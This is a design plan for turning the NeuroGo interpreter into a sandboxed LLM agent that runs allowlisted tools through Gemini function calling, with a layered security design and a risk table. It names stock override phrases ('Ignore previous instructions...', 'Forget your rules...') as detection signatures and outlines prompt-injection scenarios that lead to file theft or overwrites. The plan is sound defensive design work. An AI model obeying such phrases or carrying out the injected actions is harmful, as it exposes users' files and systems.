
# Plan for Evolving NeuroGo into a Secure LLM Agent

## Introduction

### Purpose
This document presents a comprehensive technical plan for transforming the existing NeuroGo interpreter into a secure Large Language Model (LLM) agent, designated NeuroGo-as-llm-agent. The primary objective is to enable an LLM, such as Google's Gemini, to interact safely and effectively with a user's local environment by requesting NeuroGo to execute specific, pre-approved TOOL functions.

### Concept Recap
The core concept underpinning NeuroGo-as-llm-agent involves leveraging NeuroGo not as a direct executor of potentially complex NeuroScript procedures generated by an LLM, but as a constrained, local, and secure execution engine for discrete TOOL functions requested by the LLM. This shifts the execution model: instead of NeuroGo interpreting full NeuroScript logic potentially influenced or generated by an LLM, it focuses on executing well-defined, atomic tool operations on behalf of the LLM. The LLM handles the higher-level reasoning, planning, and task decomposition, while NeuroGo provides the secure interface to the local environment through its toolset, primarily utilizing the LLM's native function calling capabilities for communication. It's important to note that these agent capabilities are designed as an addition to NeuroGo's existing role as a NeuroScript interpreter, augmenting its functionality rather than replacing it.

### Criticality of Security
Security is the paramount design principle throughout this plan. Granting LLM agents, which are susceptible to manipulation techniques like prompt injection 1, the ability to interact with local system resources introduces significant risks. These include unauthorized data access or modification, execution of malicious commands, and system disruption.3 Key threats such as prompt injection 1 and insecure tool execution leading to excessive agency 3 must be rigorously addressed through architectural choices, strict validation, and layered security controls. The plan prioritizes establishing robust defenses against these and other vulnerabilities inherent in LLM-driven tool use.

### Scope and Structure
This plan encompasses the proposed architecture, the LLM interaction protocol (with a focus on Gemini Function Calling), detailed implementation steps within the NeuroGo Go codebase, a critical security design, analysis of key challenges and risks with mitigation strategies, phased development milestones, and an examination of how this capability aligns with the broader NeuroScript project goals. The subsequent sections detail each of these aspects.

## Section 1: Proposed Architecture for NeuroGo-as-llm-agent

### 1.1. Architectural Overview
The proposed architecture positions NeuroGo as a specialized, secure "Tool Execution Backend" orchestrated by an external LLM. The interaction flow follows a controlled cycle: User -> LLM (e.g., Gemini) -> NeuroGo Agent -> Secure Tool Execution -> LLM -> User. The LLM is responsible for natural language understanding, reasoning, planning the sequence of actions, and deciding which NeuroGo TOOL function needs to be invoked to accomplish a sub-task.6 NeuroGo, operating in agent mode, receives these requests, validates them against stringent security policies, executes the permitted tools within a sandboxed context, and returns the results to the LLM for synthesis into a final user response or further planning.

This architecture aligns with several established patterns for building agentic systems:

*   Augmented LLM 8: The system's core is the external LLM, augmented with the specialized capabilities provided by the NeuroGo toolset. NeuroGo acts as the secure execution layer for these augmentations.
*   LLM + Tools + Memory 9: This pattern is directly applicable. The LLM provides the reasoning, NeuroGo implements the secure "Tools" execution layer, and NeuroGo itself must incorporate "Memory" management for conversation history and security context across interaction turns.
*   Tool Use Pattern 10: The design explicitly follows this pattern, equipping the LLM with external functionalities (local system interaction) mediated by NeuroGo's tools.
*   ReAct Pattern Elements 6: The fundamental interaction loop mirrors elements of the Reason-Act (ReAct) pattern: the LLM reasons, requests an action (NeuroGo tool call), receives an observation (tool result), and reasons again. Initially, the planning complexity within the LLM might be simpler than full ReAct implementations, but the core cycle is present.

A fundamental aspect of this architecture is the clear separation of concerns. LLMs, while powerful reasoning engines, are inherently difficult to fully secure against prompt manipulation.11 Granting them direct execution capabilities on a local machine represents an unacceptable level of risk, falling under the category of "Excessive Agency".3 This architecture mitigates that risk by using the LLM for its strengths (reasoning, natural language processing, planning) and delegating the sensitive execution phase to NeuroGo, which operates under strict, locally enforced security controls. This minimizes the attack surface directly exposed by potential LLM vulnerabilities.

### 1.2. Core Components
The NeuroGo-as-llm-agent system comprises several interacting components:

*   User Interface/Client: (External to NeuroGo modifications) The application layer responsible for capturing user input and displaying LLM/agent responses.
*   LLM API (e.g., Gemini): The external cloud-based service providing the core intelligence. It processes user prompts, manages conversational context (partially), plans execution steps, generates tool call requests via its function calling mechanism 12, and synthesizes final responses based on tool results.
*   NeuroGo Agent Core (Go): The central piece undergoing modification. This component will:
    *   Listen for and receive structured function call requests from the LLM API.
    *   Interact with the Conversation State Manager to retrieve history and store new turns.
    *   Invoke the Security Layer to validate incoming tool requests.
    *   Dispatch validated requests to the Tool Registry & Executor.
    *   Format tool execution results into the structure expected by the LLM API.
    *   Manage the overall interaction loop with the LLM API.
*   Security Layer (Go Module within NeuroGo): A distinct logical (and potentially physical code module) layer acting as the gatekeeper for all LLM-initiated tool executions. Its responsibilities include:
    *   Enforcing the Tool Allowlist configuration.
    *   Performing rigorous Argument Validation & Sanitization.3
    *   Enforcing sandboxing constraints (e.g., ensuring paths are resolved via SecureFilePath).
    *   Applying context-aware restrictions (e.g., blocking TOOL.ExecuteCommand 13 when called by the LLM).
This centralized approach simplifies security policy implementation, auditing, and future updates.1
*   Tool Registry & Executor (Existing NeuroGo mechanism, enhanced): The existing NeuroGo component that registers available TOOL functions and executes their Go code. It requires enhancement to:
    *   Accept security context information (e.g., sandboxing parameters, caller context).
    *   Ensure tools adhere to security constraints during execution.
*   Conversation State Manager (Go Module within NeuroGo): A new component responsible for maintaining the history of the interaction across multiple turns. This includes:
    *   Storing user prompts, LLM text responses, LLM function call requests, and NeuroGo function execution results.15
    *   Maintaining the active security configuration (allowlist, sandbox root) for the current session.
    *   Formatting the history correctly for submission to the LLM API on each turn.

### 1.3. Interaction Flow (Detailed Cycle)
The interaction between these components follows a precise cycle:

1.  The user submits a prompt via the User Interface/Client.
2.  The client sends the prompt, along with the current conversation history retrieved from NeuroGo's Conversation State Manager, to the designated LLM API (e.g., Gemini).
3.  The LLM analyzes the input and its available function declarations (representing NeuroGo TOOLs). If it determines an action requiring local interaction is needed, it formulates a tool call.
4.  The LLM API responds not with direct execution, but with a structured FunctionCall object specifying the target TOOL.FunctionName and the arguments it derived.12 This inability of the LLM to directly execute the function is a key architectural choice.12
5.  The NeuroGo Agent Core receives this FunctionCall object.
6.  NeuroGo passes the tool name and arguments to the Security Layer for validation.
7.  The Security Layer performs its checks sequentially:
    *   Verifies the requested tool name is present in the configured allowlist for LLM invocation.
    *   Performs strict validation and sanitization on the arguments provided by the LLM, treating them as untrusted input.17
    *   Checks for and applies any context-specific restrictions (e.g., denying the call if it's a high-risk tool like TOOL.ExecuteCommand 13 in the LLM context 3).
8.  If all security checks pass, the NeuroGo Agent Core dispatches the call, providing the validated (and potentially sanitized) arguments to the Tool Registry/Executor. Sandboxing mechanisms (like SecureFilePath) are typically enforced within the tool's implementation, guided by the security context established by the Security Layer.
9.  The requested TOOL function executes its logic, adhering to any imposed security constraints (e.g., accessing files only within the designated sandboxed directory).
10. The TOOL function returns its result (e.g., file content, command output, success/error status) back to the NeuroGo Agent Core.
11. NeuroGo formats this result into a FunctionResponse structure, suitable for the LLM API.12
12. NeuroGo updates the Conversation State Manager, adding the FunctionCall and the corresponding FunctionResponse to the history.
13. NeuroGo sends the FunctionResponse (along with the updated conversation history) back to the LLM API.
14. The LLM processes the tool's result, incorporates it into its reasoning, and generates the next response. This might be another FunctionCall if more actions are needed, or a final natural language answer for the user.
15. The LLM API sends this final response back to NeuroGo/client.
16. The client displays the LLM's response to the user.

This cycle repeats for each turn of the conversation requiring tool interaction. The choice of the Gemini API aligns well with this architecture. Its function calling mechanism, which returns a request object rather than attempting direct execution 12, naturally supports the secure delegation model by providing the necessary interception point for NeuroGo's security layer.

## Section 2: LLM Interaction Protocol via Gemini Function Calling

### 2.1. Primary Mechanism: Gemini API Function Calling
The primary and recommended protocol for communication between the LLM and NeuroGo will be the native Function Calling feature provided by the Gemini API.12 This mechanism allows NeuroGo to declare its available TOOLs to the LLM in a structured format.

The implementation will require NeuroGo to generate FunctionDeclaration objects for each allowlisted TOOL. Each declaration must include 12:
*   Name: The exact TOOL.FunctionName string.
*   Description: A clear, concise natural language description of what the tool does, its purpose, and when it should be used. This description is critical for the LLM to accurately determine when to call the tool.12 This information can be derived from the mandatory COMMENT: blocks within NeuroScript procedures or associated metadata.
*   Parameters: An object describing the parameters the tool accepts, following the OpenAPI JSON Schema specification (subset supported by Gemini). For each parameter, this includes its name, type (e.g., string, integer, boolean, array, object), a description, and whether it is required.12

Generating these declarations accurately is vital. While the Gemini Python SDK offers utilities to infer schemas from type-annotated Python functions 7, NeuroGo will need a Go-based implementation. This could involve using Go's reflection capabilities to inspect the registered TOOL function signatures for parameter names and types, combined with parsing structured comments or metadata associated with each tool to extract the necessary descriptions. The quality and precision of these declarations directly influence the LLM's ability to correctly invoke tools and provide appropriate arguments, which has significant implications for both functionality and security. Vague descriptions or incorrect parameter definitions increase the risk of the LLM making erroneous or potentially harmful requests.12

### 2.2. Data Structures
The interaction relies on specific JSON structures exchanged via the Gemini API:

*   Tool Request (LLM -> NeuroGo): When the LLM decides to call a tool, the API response will contain a functionCall part. NeuroGo must parse this structure, which typically includes 12:
    *   name: (String) The name of the function (tool) the LLM wants to execute (e.g., "TOOL.ReadFile").
    *   args: (Object/Map) A JSON object containing the arguments for the function, with parameter names as keys and their corresponding values (e.g., {"path": "/path/to/file.txt"}).
*   Tool Result (NeuroGo -> LLM): After NeuroGo executes the tool (following security validation), it must send the result back to the LLM API. This is done by including a Part in the next request to the API containing a functionResponse object 12:
    *   name: (String) The name of the function that was executed (matching the functionCall.name).
    *   response: (Object/Map) A JSON object containing the result of the function execution. This should include a field indicating success or failure, and the actual data returned by the tool (e.g., {"content": "file content here"}) or structured error information.

The explicit nature of this request-response cycle for tool execution is a key security feature. The LLM requests an action, but NeuroGo intercepts the request, performs validation, executes the action in a controlled manner, and then explicitly reports the outcome back to the LLM.12 This prevents the LLM from having any direct, unchecked pathway to execution.

### 2.3. Handling Multiple/Parallel Tool Calls
The Gemini API supports suggesting multiple function calls within a single response turn, potentially enabling parallel execution of independent tasks.12 While this offers potential performance benefits, it also increases complexity, particularly regarding security validation and state management.

For the initial implementation (Phase 1), it is recommended that NeuroGo handle multiple functionCall objects received in a single turn sequentially. This simplifies the logic and ensures that the security context is clearly defined for each call. The architecture should, however, be designed with the possibility of future parallel execution in mind. If parallelism is implemented later, the Security Layer must be capable of validating each proposed parallel call independently before dispatch, and the Tool Executor must handle concurrent execution safely.

### 2.4. Function Calling Mode Configuration
The Gemini API provides a function_calling_config parameter with different modes to control the LLM's tool usage behavior 12:

*   AUTO (Default): The LLM decides whether to respond with text or a function call based on the prompt and context.
*   ANY: The LLM is forced to respond with a function call. An optional allowed_function_names list can restrict the LLM's choice to a specific subset of the declared tools.
*   NONE: The LLM is prohibited from making function calls, behaving as if no tools were declared.

It is recommended to start with AUTO mode to provide the LLM with maximum flexibility. However, NeuroGo should allow configuration of this mode. For specific use cases requiring more constrained behavior, ANY mode, possibly combined with allowed_function_names, could be employed to ensure the LLM only attempts specific, expected tool interactions.

### 2.5. Fallback Strategy (Structured Data in Chat)
In scenarios where native function calling might fail or prove problematic (e.g., unexpected API changes, complex argument structures not easily representable), a fallback mechanism should be considered, although it is less robust and less preferred.

This fallback would involve defining a specific structured format (e.g., a JSON object within a designated markdown code block like json_tool_request...) that the LLM could embed within its standard text response. NeuroGo would need additional logic in its response processing pipeline to detect these specific blocks, parse the JSON content, extract the tool name and arguments, route them through the exact same Security Layer and Tool Executor as native function calls, capture the result, format it similarly (e.g., json_tool_result...), and inject this result back into the conversation history before sending the next request to the LLM. This approach adds parsing complexity and relies on the LLM consistently adhering to the custom format.

## Section 3: Implementation Plan for NeuroGo Modifications (Go)

Implementing the NeuroGo-as-llm-agent capability requires significant modifications and additions to the existing NeuroGo Go codebase. The following outlines the key areas of work:

### 3.1. llm.go Adaptations
The existing code responsible for interacting with LLMs (presumably in llm.go, based on query context 20) needs substantial enhancement to support the full Gemini function calling workflow.12 This involves:

*   Function Declaration Generation: Implement logic to dynamically generate FunctionDeclaration JSON structures. This process should iterate through the registered (and allowlisted) NeuroGo TOOLs, using Go reflection to determine function parameter names and types, and parsing associated COMMENT: blocks or metadata to extract meaningful descriptions. Robust parsing and error handling are crucial here.
*   API Request Construction: Modify the code that builds the request to the Gemini API (GenerateContentRequest). It must now include the generated tools field containing the list of FunctionDeclarations. Crucially, it must also include the full conversation history, correctly formatted with user messages, model responses, and previous functionCall/functionResponse pairs, managed by the new Conversation State Manager.
*   API Response Parsing: Enhance the response handling logic to specifically detect and extract functionCall parts from the GenerateContentResponse. It needs to differentiate between a standard text response and a request to execute a tool.
*   Interaction Loop Management: Implement the core agent loop logic. This involves: receiving a response, checking for functionCalls, if found: dispatching to the Security Layer and Tool Executor, receiving the result, formatting it as a functionResponse, updating the state manager, and sending the result back to the Gemini API in the next request. If no functionCall is received, the loop handles the text response appropriately (e.g., passing it to the client).

### 3.2. Conversation State Management
A new, dedicated component for managing conversation state is required. This state manager (likely a Go struct within a new package) must:

*   Store Conversation History: Maintain an ordered list of conversational turns, adhering precisely to the structure expected by the Gemini API (alternating user/model roles, including functionCall and functionResponse parts where applicable).12 This history is essential context for the LLM. Memory is a fundamental component of effective agent architectures.15
*   Store Session Context: Hold session-specific information, particularly the active security configuration (loaded tool allowlist, sandboxing root directory, current security level). This context is needed by the Security Layer during validation.
*   Manage Context Window: Implement strategies to handle potential context window limitations of the LLM, especially in long conversations. This might involve simple truncation, more sophisticated summarization techniques, or relying on models with larger context capacities.7
*   Persistence (Optional): For Phase 1, in-memory state management might suffice. Future phases could consider persistence options (e.g., file-based storage) to allow for longer-running agent sessions or recovery.

### 3.3. Secure TOOL Dispatch Mechanism
The existing logic within NeuroGo that handles CALL TOOL.FunctionName(...) directives (likely in interpreter_*.go files) needs refactoring to accommodate the agent mode:

*   Contextual Dispatch: The dispatcher must differentiate between a tool call originating from parsed NeuroScript code and one originating from an LLM FunctionCall request.
*   Security Layer Invocation: For LLM-originated calls, the dispatcher must first route the request (tool name, arguments, session security context) through the Security Layer for validation before invoking the actual tool function.
*   Argument Handling: The dispatcher must receive the potentially validated and sanitized arguments back from the Security Layer and pass these modified arguments to the tool function, not the raw arguments received from the LLM.
*   Error Handling: Gracefully handle failures reported by the Security Layer (e.g., disallowed tool, invalid arguments), formatting an appropriate error FunctionResponse to send back to the LLM instead of attempting execution.

### 3.4. TOOL Refactoring for Security
Existing and future TOOL implementations require security-focused refactoring:

*   Review Existing Tools: Systematically review all tools, paying close attention to those interacting with the filesystem (TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir, etc.), network resources, or external processes (TOOL.ExecuteCommand 13, TOOL.GitCommit, TOOL.GoBuild, etc.).
*   Mandate Sandboxing Primitives: Enforce the use of robust sandboxing mechanisms, such as the SecureFilePath abstraction 22, for all file path operations initiated via the LLM agent context. This likely requires modifying tool function signatures to accept validated path objects or incorporating validation logic internally. Raw string paths from the LLM must be rejected for sensitive operations.
*   Inject Context Awareness: Tools must be able to determine their invocation context (NeuroScript vs. LLM Agent). This allows implementing context-dependent behavior, most critically disabling or severely restricting high-risk operations like arbitrary command execution (TOOL.ExecuteCommand 13) when called by the LLM.17 This context could be passed via a Go context.Context parameter or a specific flag during invocation.

### 3.5. Agent Mode Configuration
NeuroGo needs mechanisms to configure and manage its operation in agent mode:

*   Activation: Command-line flags or configuration file settings to enable/disable agent mode.
*   LLM Configuration: Parameters to specify the LLM API endpoint, API key, desired model name (e.g., "gemini-1.5-pro-latest"), and function calling mode (AUTO, ANY, NONE).18
*   Security Configuration:
    *   Path to the TOOL allowlist file for the LLM agent.
    *   Specification of the root directory for path sandboxing (SecureFilePath base).
    *   Settings to control the strictness of security checks (e.g., explicitly enabling/disabling specific high-risk tools for the LLM context).

Propagating this configuration securely and reliably throughout the application is a key implementation detail. The security context (allowlists, sandbox settings) defined at startup must be accessible to the agent core, the security layer, and potentially influence tool behavior during runtime. Using Go's context package is a viable approach to pass this information down the call stack without resorting to global variables.

## Section 4: Critical Security Design

The security of NeuroGo-as-llm-agent is paramount. Given the inherent risks of LLMs interacting with local environments 3, particularly the threat of prompt injection 1 leading to malicious tool invocation, a multi-layered defense strategy is mandatory. The design must operate under the core principle that any tool name or argument suggested by the LLM is untrusted input 23 until explicitly validated and sanitized by NeuroGo's Security Layer.

### 4.1. TOOL Allowlisting
*   Mechanism: A configuration file (e.g., YAML or JSON) will explicitly list the TOOL.FunctionName strings that the LLM agent is permitted to request. Tools not present in this list cannot be invoked by the LLM.
*   Enforcement: The Security Layer performs this check as the first step upon receiving a FunctionCall from the LLM. If the requested tool name is not in the allowlist, the request is rejected immediately with an error response. This directly addresses the OWASP LLM risk of Excessive Agency (LLM08 3) by strictly limiting the LLM's potential actions to a pre-approved set.5

### 4.2. Strict Argument Validation and Sanitization
*   Strategy: After confirming a tool is allowlisted, the Security Layer must perform rigorous validation and sanitization on all arguments provided by the LLM within the FunctionCall.args object. This treats the LLM's output as potentially malicious user input.3
*   Implementation:
    *   Type Checking: Verify that the data type of each received argument matches the expected type defined for the tool's parameter (e.g., string, integer, boolean). Reject mismatches.
    *   Content Sanitization (Context-Specific):
        *   File Paths: MUST NOT be accepted as raw strings for tools performing filesystem operations. They must be passed to and validated by the sandboxing mechanism (SecureFilePath) described in 4.3. Reject any attempt to use raw paths directly.
        *   Shell Commands (for TOOL.ExecuteCommand 13 or similar, if ever enabled): This is extremely high-risk. If allowed at all, arguments must undergo extreme sanitization, character allowlisting, escaping, and potentially rejection of anything beyond simple, predefined command structures. Parameterization is essential.17 The default recommendation remains to disable such tools entirely for the LLM (see 4.4).
        *   URLs: Validate URL formats strictly. Restrict allowed protocols (e.g., HTTPS only). Consider allowlisting/blocklisting domains for network-accessing tools.
        *   SQL (if applicable): Never construct SQL queries by concatenating LLM output. Use parameterized queries exclusively where the LLM provides only the parameter values, not the query structure.2
        *   General Strings: Scan for known prompt injection signatures (e.g., "Ignore previous instructions...", "Forget your rules...").1 Filter or reject control characters. Enforce reasonable length limits. Where possible, validate against expected formats using regular expressions or allowlist patterns.3
    *   Value/Range Checks: For numeric arguments or arguments used in internal logic, validate that they fall within expected ranges or adhere to specific constraints.

### 4.3. Mandatory Path Sandboxing
*   Mechanism: All tool operations involving filesystem paths requested by the LLM must be constrained within a designated sandboxed directory ("workspace"). The SecureFilePath abstraction 22 or an equivalent robust mechanism is central to enforcing this.
*   Implementation:
    *   A base workspace directory is defined via configuration.
    *   The Security Layer validates any argument intended as a path, ensuring it resolves safely within the workspace root using the SecureFilePath logic. This logic must prevent path traversal attacks (e.g., using ../).
    *   Filesystem-interacting TOOLs (e.g., TOOL.ReadFile, TOOL.WriteFile, TOOL.ListDir) are refactored to operate exclusively on these validated, sandboxed path representations. They must reject raw string paths passed from the LLM context.
*   Enforcement: This sandboxing is non-negotiable for any filesystem access triggered by the LLM. It aligns with best practices for secure execution environments 24 and is a critical defense against unauthorized file access or modification resulting from prompt injection.

### 4.4. High-Risk Tool Restriction/Disabling
*   Policy: A clear policy must govern tools deemed high-risk, primarily those enabling arbitrary code execution (TOOL.ExecuteCommand 13), direct modification of system configuration, or broad, unconstrained interactions.
*   Default Behavior: These high-risk tools MUST be disabled by default for invocation by the LLM agent.
*   Conditional Enabling: Enabling should require explicit configuration overrides. For extremely sensitive actions, consider requiring runtime user confirmation (human-in-the-loop verification 5) for each invocation requested by the LLM, even if the tool is configurationally enabled.
*   Implementation: The Security Layer checks both the requested tool name and the invocation context (LLM agent vs. NeuroScript). If a high-risk tool is requested by the LLM, the call is denied unless explicitly permitted by the session's security configuration (and potentially runtime confirmation). This directly mitigates critical risks like Remote Code Execution (RCE) and unintended consequences from excessive agency.17

### 4.5. Input/Output Filtering (Defense in Depth)
While primary defenses focus on validating the LLM's requests, additional filtering provides defense in depth:

*   Input Filtering (User Prompt -> LLM): Basic filtering can be applied to the initial user prompt before sending it to the LLM API. This might strip obvious malicious patterns or known injection strings. However, this is considered a weak defense, as attackers constantly devise new ways to bypass such filters.1
*   Output Filtering (Tool Result -> LLM): Before sending the result of a tool execution back to the LLM via FunctionResponse, NeuroGo should sanitize the output. This aims to prevent the inadvertent leakage of sensitive information that the tool might have accessed (e.g., redacting passwords or API keys from configuration file content, truncating excessively long outputs).3 It also helps prevent malicious content potentially generated by the tool itself (if compromised) from reaching the LLM or the user.

### 4.6. Security Measures Summary

| Security Measure                 | Purpose                                                             | Implementation Detail                                                                                                | Configuration Mechanism                                             |
|:---------------------------------|:--------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------|:--------------------------------------------------------------------|
| Tool Allowlisting                | Limit LLM capabilities to pre-approved functions 3                  | Security Layer checks FunctionCall.name against configured list before any other validation.                         | External file (e.g., YAML/JSON) listing allowed TOOL.FunctionNames. |
| Argument Type Validation         | Prevent type mismatches causing errors or bypassing checks.         | Security Layer compares FunctionCall.args types against tool signature/declaration.                                  | Implicit via tool definition.                                       |
| Argument Content Sanitization    | Detect/neutralize malicious payloads (injection, traversal, etc.) 2 | Security Layer applies context-specific rules (path validation, command escaping, URL checks, SQL parameterization). | Security policy settings (e.g., strictness levels).                 |
| Path Sandboxing (SecureFilePath) | Confine filesystem access to designated workspace 24                | Security Layer validates paths; Tools operate only on validated path objects; Prevents traversal (../).              | Configuration of workspace root directory.                          |
| High-Risk Tool Restriction       | Prevent LLM from invoking dangerous tools (e.g., command exec) 3    | Security Layer denies calls to specific tools from LLM context by default.                                           | Explicit flag/setting to enable (discouraged).                      |
| Input Filtering (Basic)          | Preliminary attempt to block malicious user prompts.                | Optional pre-processing of user input before sending to LLM API.                                                     | Configurable filter rules/patterns.                                 |
| Output Filtering (Tool Results)  | Prevent leakage of sensitive data via tool results 3                | Post-processing of tool return values before formatting FunctionResponse.                                            | Configurable redaction/filtering rules.                             |

This multi-layered approach is essential. Security cannot hinge on a single point of failure. Allowlisting provides coarse-grained control, argument validation targets specific malicious inputs, sandboxing contains filesystem operations, and restrictions block entire classes of dangerous actions. Prompt injection attempts that might bypass one layer (e.g., basic input filtering) could be caught by argument sanitization or rendered harmless by sandboxing.3 Furthermore, the effectiveness of these measures heavily depends on correct and secure configuration. Secure defaults (e.g., high-risk tools disabled, minimal allowlist) are critical, as misconfiguration can easily undermine the entire security posture.5

## Section 5: Key Challenges, Risks, and Mitigation

Developing NeuroGo-as-llm-agent involves navigating several significant challenges and risks, particularly concerning security and reliability.

### 5.1. Security Vulnerabilities
The most critical risks stem from potential security vulnerabilities:

*   Prompt Injection (OWASP LLM01 3): Attackers may craft user prompts or embed malicious instructions in data processed by the LLM (indirect injection) to trick the LLM into generating harmful FunctionCall requests. This could lead to requests for unauthorized file access (TOOL.ReadFile on sensitive files), data modification (TOOL.WriteFile to overwrite system files or inject code), data exfiltration (leaking sensitive info via tool arguments), or execution of arbitrary commands if high-risk tools are improperly enabled.
    *   Mitigation: Primarily relies on the multi-layered defenses outlined in Section 4: strict tool allowlisting, rigorous argument validation and sanitization (treating LLM args as hostile input), mandatory path sandboxing, default disabling of high-risk tools, and output filtering. Advanced mitigations like dual-LLM validation 28 or prompt rewriting 4 could be explored in later phases if initial defenses prove insufficient. The core strategy is containment: assume injection might succeed at the LLM level, but prevent the malicious request from being executed dangerously by NeuroGo.17
*   Insecure Output Handling (OWASP LLM02 3): If a tool's output (which is sent back to the LLM) contains malicious content (e.g., executable scripts, harmful instructions for the LLM), and this output is processed insecurely later (either by the LLM itself influencing subsequent actions, or by the client displaying the final response), it could lead to downstream exploits like Cross-Site Scripting (XSS) or further manipulation.
    *   Mitigation: Sanitize tool outputs within NeuroGo before sending them back to the LLM (Section 4.5). Ensure the client application responsible for rendering the final LLM response implements appropriate security measures (e.g., proper HTML escaping).
*   Insecure Plugin/Tool Design (OWASP LLM07 3): Vulnerabilities within the Go code of the NeuroGo TOOLs themselves could be exploited, even if the LLM's request was initially benign. For example, a buffer overflow in a tool processing file content, or improper handling of external library calls.
    *   Mitigation: Adherence to secure coding practices during tool development, mandatory use of security primitives like SecureFilePath, applying the principle of least privilege within tool logic, thorough code reviews, and regular dependency scanning.
*   Excessive Agency (OWASP LLM08 3): Granting the LLM access to an overly broad or powerful set of tools increases the potential impact of any successful attack or even accidental misuse.
    *   Mitigation: Strict enforcement of the TOOL allowlist (Section 4.1), ensuring only necessary tools are permitted. Default disabling/restriction of high-risk tools (Section 4.4). Design tools with minimal necessary functionality.
*   Data Exfiltration/Leakage (OWASP LLM06 3): An attacker could use prompt injection to coerce the LLM into requesting tools that read sensitive files (TOOL.ReadFile) and return their content. Data could also leak if sensitive information is passed as arguments to tools that might log these arguments or interact with external systems insecurely.
    *   Mitigation: Mandatory path sandboxing prevents access to arbitrary files (Section 4.3). Output filtering can redact sensitive patterns from tool results (Section 4.5). Careful tool design to avoid returning excessive data. Implement monitoring and auditing of tool calls and arguments.5
*   Sandboxing Bypass: Flaws in the design or implementation of the path sandboxing mechanism (SecureFilePath or equivalent) could potentially allow an attacker to craft arguments that escape the intended workspace directory, leading to unauthorized file access.
    *   Mitigation: Rigorous design, implementation, and testing of the sandboxing logic. Security code reviews specifically targeting the sandboxing component. Consider exploring OS-level sandboxing features (e.g., containers, chroot) for enhanced isolation in future phases, though this adds deployment complexity.

### 5.2. LLM Reliability Issues
Beyond malicious attacks, the inherent nature of LLMs presents reliability challenges:

*   Hallucinated Tool Calls/Arguments: LLMs may occasionally "hallucinate" â€“ generating requests for tools that don't exist, or providing arguments that are nonsensical, incorrectly formatted, or outside expected ranges, even without malicious input.14
    *   Mitigation: The tool allowlist catches non-existent tool names. Robust argument validation (type, format, range checks) in the Security Layer (Section 4.2) is crucial for catching invalid arguments. High-quality, clear function declarations provided to the LLM can reduce the likelihood of such errors.19 Implement clear error handling that reports failures back to the LLM, potentially allowing it to retry or reformulate the request.
*   Incorrect Tool Selection: The LLM might choose a valid but inappropriate tool for the user's intended task, leading to incorrect results or inefficient workflows.
    *   Mitigation: Precise and descriptive function declarations are key.19 Limiting the number of available tools in the allowlist can reduce ambiguity.14 For critical or irreversible actions, implementing a user confirmation step (human-in-the-loop 5) before executing the tool could be considered.
*   API Failures/Rate Limits: Dependency on an external LLM API introduces risks of network failures, API downtime, or hitting usage rate limits imposed by the provider.
    *   Mitigation: Implement robust error handling in NeuroGo's LLM client code, including retries with exponential backoff for transient errors.14 Provide clear feedback to the user in case of persistent failures. Implement caching for LLM responses or tool results where appropriate and safe to reduce API calls.

### 5.3. State Management Complexity
Managing the conversation state effectively presents challenges:

*   Growing Context Window: As conversations become longer, the accumulated history of prompts, responses, and tool interactions can exceed the LLM's context window limit, leading to loss of information or increased API costs.7
    *   Mitigation: Implement strategies within the Conversation State Manager, such as summarizing older parts of the conversation, using a sliding window approach, or selecting LLM models specifically designed for larger context windows (e.g., Gemini 1.5 Pro 7).
*   State Synchronization: Ensuring the state maintained by NeuroGo is consistent and correctly formatted for the LLM API is crucial. This becomes more complex if persistence or concurrent agent sessions are considered in the future.
    *   Mitigation: Careful design of the state manager's data structures and update logic. For initial phases focusing on single-user, single-session operation, complexity is lower. If concurrency is introduced later, appropriate locking mechanisms or atomic operations would be necessary.

### 5.4. Performance Considerations
Agentic workflows involving LLM calls and tool execution can impact performance:

*   Latency: Each round trip to the LLM API, plus the time for NeuroGo's security checks and tool execution, adds latency to the user experience.29 Complex tasks requiring multiple tool calls can become slow.
    *   Mitigation: Optimize the performance of security checks and tool implementations. Choose LLM models that balance capability and speed (e.g., Gemini Flash 21 might be suitable for some tasks). Cautiously explore parallel execution of independent tool calls in later phases (Section 2.3). Cache tool results where appropriate (e.g., reading the same file multiple times).
*   Cost: LLM API usage typically incurs costs based on the number of input and output tokens processed.14 Long conversations and verbose tool results can increase costs.
    *   Mitigation: Optimize prompt engineering to be concise. Manage the context window size effectively (Section 5.3). Use less expensive LLM models for simpler intermediate steps if a multi-LLM approach is adopted later. Implement caching to avoid redundant API calls.

### 5.5. Risk/Challenge Analysis Summary

| Risk/Challenge            | Description                                                                    | Potential Impact                                                     | Mitigation Strategy (Ref. Section 4 Measures)                                                                                                         | Relevant References |
|:--------------------------|:-------------------------------------------------------------------------------|:---------------------------------------------------------------------|:------------------------------------------------------------------------------------------------------------------------------------------------------|:--------------------|
| Prompt Injection          | Manipulating LLM via prompt to suggest malicious tool calls.                   | Data breach, unauthorized modification/execution, system disruption. | Allowlisting (4.1), Arg Validation/Sanitization (4.2), Sandboxing (4.3), High-Risk Tool Restriction (4.4), Output Filtering (4.5). Containment focus. | 3                   |
| Insecure Output Handling  | Tool output contains malicious content processed insecurely downstream.        | XSS, CSRF, further LLM manipulation.                                 | Output Filtering (4.5), Secure client-side rendering.                                                                                                 | 3                   |
| Insecure Tool Design      | Vulnerabilities within NeuroGo TOOL code itself.                               | Exploitation independent of LLM, potential escalation.               | Secure coding practices, Sandboxing (4.3), Least privilege, Code reviews.                                                                             | 3                   |
| Excessive Agency          | Granting LLM access to too many or too powerful tools.                         | Increased attack surface, higher impact of misuse/compromise.        | Allowlisting (4.1), High-Risk Tool Restriction (4.4), Minimal tool functionality.                                                                     | 3                   |
| Data Exfiltration/Leakage | Tricking tools into reading/returning sensitive data or leaking via args.      | Loss of confidentiality, privacy violations.                         | Sandboxing (4.3), Output Filtering (4.5), Careful tool design, Monitoring/Auditing.                                                                   | 3                   |
| Sandbox Bypass            | Flaws in sandboxing logic allowing access outside workspace.                   | Unauthorized file access/modification.                               | Rigorous implementation/testing of sandboxing (4.3), Code reviews.                                                                                    |                     |
| Hallucinated Calls/Args   | LLM invents tools or provides nonsensical/invalid arguments.                   | Tool execution errors, unexpected behavior.                          | Allowlisting (4.1), Arg Validation (4.2), Quality function declarations, Error handling.                                                              | 14                  |
| Incorrect Tool Selection  | LLM chooses a valid but inappropriate tool for the task.                       | Incorrect results, inefficient workflow.                             | Quality function descriptions, Limit toolset ambiguity, Optional user confirmation.                                                                   |                     |
| API Failures/Rate Limits  | External LLM API unavailability or usage limits.                               | Service disruption, poor user experience.                            | Error handling, Retries with backoff 14, Caching, User feedback.                                                                                      | 14                  |
